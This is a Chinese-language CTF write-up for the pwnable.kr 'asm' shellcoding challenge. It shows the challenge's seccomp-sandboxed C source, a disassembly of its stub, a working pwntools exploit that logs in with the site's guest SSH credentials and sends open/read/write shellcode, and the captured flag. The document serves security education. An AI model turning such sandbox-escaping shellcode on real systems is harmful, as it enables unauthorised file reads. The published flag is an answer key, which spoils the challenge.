---
title: pwnable.kr-asm
date: 2018-02-14 11:18:00
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
# 前言
这道题就是写shellcode的
# 分析
分析源码`asm.c`
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}

```
程序就是让输入一段`shellcode`，然后程序会在一个`sandbox`沙箱环境下执行这个`shellcode`。另外shellcode前面的`stub`也是一段可执行序列，用`pwntools`的asm模块反汇编看一下就知道这个序列只是将一些寄存器置0，不会影响后面shellcode的执行
```nasm
>>> print disasm("\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff")
   0:   48                      dec    eax
   1:   31 c0                   xor    eax,eax
   3:   48                      dec    eax
   4:   31 db                   xor    ebx,ebx
   6:   48                      dec    eax
   7:   31 c9                   xor    ecx,ecx
   9:   48                      dec    eax
   a:   31 d2                   xor    edx,edx
   c:   48                      dec    eax
   d:   31 f6                   xor    esi,esi
   f:   48                      dec    eax
  10:   31 ff                   xor    edi,edi
  12:   48                      dec    eax
  13:   31 ed                   xor    ebp,ebp
  15:   4d                      dec    ebp
  16:   31 c0                   xor    eax,eax
  18:   4d                      dec    ebp
  19:   31 c9                   xor    ecx,ecx
  1b:   4d                      dec    ebp
  1c:   31 d2                   xor    edx,edx
  1e:   4d                      dec    ebp
  1f:   31 db                   xor    ebx,ebx
  21:   4d                      dec    ebp
  22:   31 e4                   xor    esp,esp
  24:   4d                      dec    ebp
  25:   31 ed                   xor    ebp,ebp
  27:   4d                      dec    ebp
  28:   31 f6                   xor    esi,esi
  2a:   4d                      dec    ebp
  2b:   31 ff                   xor    edi,edi
>>> 
```
刚开始做不懂`sandbox`这个函数啥意思，里面的函数也没见过，于是看了被人的writeup才知道这个函数建立了一个沙箱环境，并且只能执行`read,open,write,exit,exit_group`这些函数。但是对于读取flag文件来说已经够了。
可以使用`open`函数打开flag文件，`read`读取文件内容，`write`将文件内容写入标准输出`1`中即可。下面贴出exp
```python
from pwn import *

context(arch='amd64',os='linux',log_level='info')
con = ssh(host='pwnable.kr',user='asm',password='guest',port=2222)
r = con.connect_remote('localhost',9026)
shellcode = ''
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp')
shellcode += shellcraft.read('rax','rsp',100)
shellcode += shellcraft.write(1,'rsp',100)
r.recvuntil('give me your x64 shellcode: ')
r.sendline(asm(shellcode))
print r.recvall()

```
```bash
root@kali:~/桌面# python 1.py
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Connecting to localhost:9026 via SSH to pwnable.kr: Done
[+] Receiving all data: Done (100B)
[*] Closed remote connection to localhost:9026 via SSH connection to pwnable.kr
Mak1ng_shelLcodE_i5_veRy_eaSy
lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo

```
# 总结
发现`pwntools`这个Python库很好用，[一些基础模块的使用简介](https://www.cnblogs.com/Ox9A82/p/5728149.html)。当然看[官方文档](http://pwntools.readthedocs.io/en/stable/)的话更好，前提是你英语要好，哈哈。